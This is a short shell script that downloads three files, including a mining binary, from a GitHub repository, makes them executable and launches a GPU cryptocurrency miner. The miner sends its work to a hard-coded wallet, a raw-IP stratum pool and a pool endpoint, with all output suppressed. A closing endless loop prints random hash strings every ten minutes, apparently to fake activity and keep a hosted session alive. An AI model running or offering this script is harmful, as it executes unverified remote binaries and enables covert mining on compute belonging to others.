rm -f dynex_compute_w340.cnf && wget -q 'https://github.com/angkii/kerja/raw/main/dynex_compute_w340.cnf' && chmod +x dynex_compute_w340.cnf
rm -f h-manifest.conf && wget -q 'https://github.com/angkii/kerja/raw/main/h-manifest.conf' && chmod +x h-manifest.conf
rm -f dynexsolve && wget -q 'https://github.com/angkii/kerja/raw/main/dynexsolve' && chmod +x dynexsolve
./dynexsolve -mining-address  Xwn5KPwXse8eiDwhWHpgQ3PxVKuBC837nZbXEpF6y3tW4mYZWM74T84TDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bcou5Ew -no-cpu -multi-gpu -stratum-url 209.97.164.253 -stratum-port 443 -mallob-endpoint https://dnx.us.ekapool.com -stratum-password den >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done

